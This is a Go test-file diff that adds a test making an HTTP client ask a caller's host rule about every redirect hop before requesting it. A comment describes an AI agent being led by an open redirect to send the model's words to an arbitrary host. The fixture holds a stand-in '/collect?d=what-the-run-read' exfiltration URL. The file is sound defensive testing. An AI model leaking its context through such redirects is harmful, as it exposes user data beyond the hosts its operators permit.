@@ -12,6 +12,7 @@ import (
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/pem"
+	"errors"
 	"io"
 	"math/big"
 	"net"
@@ -23,6 +24,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 )
@@ -64,7 +66,7 @@ func trustOwnAuthority() (string, error) {
 		IsCA: true, BasicConstraintsValid: true,
 		KeyUsage:    x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
 		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
-		DNSNames:    []string{"answer.test", "inbox.test"},
+		DNSNames:    []string{"answer.test", "inbox.test", "elsewhere.test"},
 	}
 	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
 	if err != nil {
@@ -249,5 +251,67 @@ func TestDoCheckedGivesUpOnAReceiverThatDrips(t *testing.T) {
 	case <-done:
 	case <-time.After(10 * time.Second):
 		t.Fatalf("DoChecked is still waiting after %s with a timeout of 1s", time.Since(start).Round(time.Second))
+	}
+}
+
+// A caller with a rule about hosts is asked about every hop of a redirect
+// before anything is sent there. Without it, an agent that may read one host
+// was sent on by an open redirect on that host to any public host at all,
+// with the model's words in the query, and the request had been made before
+// anything could say no.
+func TestEveryHopIsPutToTheCallerBeforeItIsRequested(t *testing.T) {
+	var port string
+	var mu sync.Mutex
+	var elsewhere []string
+	port = serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		host, _, _ := net.SplitHostPort(r.Host)
+		switch {
+		case host == "elsewhere.test":
+			mu.Lock()
+			elsewhere = append(elsewhere, r.URL.String())
+			mu.Unlock()
+			http.Redirect(w, r, "https://answer.test:"+port+"/landed", http.StatusFound)
+		case r.URL.Path == "/go":
+			http.Redirect(w, r, r.URL.Query().Get("to"), http.StatusFound)
+		default:
+			_, _ = io.WriteString(w, "landed")
+		}
+	}))
+	start := "https://answer.test:" + port + "/go?to=" +
+		url.QueryEscape("https://elsewhere.test:"+port+"/collect?d=what-the-run-read")
+
+	c := toServer("agent-web")
+	var asked []string
+	c.Redirect = func(next *url.URL) error {
+		asked = append(asked, next.Hostname())
+		if next.Hostname() != "answer.test" {
+			return errors.New("not a host this agent may read")
+		}
+		return nil
+	}
+	if _, err := c.Get(context.Background(), start); err == nil || !strings.Contains(err.Error(), "not a host this agent may read") {
+		t.Errorf("a hop the caller refused: %v", err)
+	}
+	mu.Lock()
+	if len(elsewhere) > 0 {
+		t.Errorf("the refused host was asked for %q", elsewhere)
+	}
+	mu.Unlock()
+	if strings.Join(asked, " ") != "elsewhere.test" {
+		t.Errorf("the caller was asked about %q", asked)
+	}
+
+	// Allowed, every hop is asked about, the one back as well.
+	asked = nil
+	c.Redirect = func(next *url.URL) error {
+		asked = append(asked, next.Hostname())
+		return nil
+	}
+	res, err := c.Get(context.Background(), start)
+	if err != nil || string(res.Body) != "landed" {
+		t.Fatalf("%v", err)
+	}
+	if strings.Join(asked, " ") != "elsewhere.test answer.test" {
+		t.Errorf("the caller was asked about %q", asked)
 	}
 }
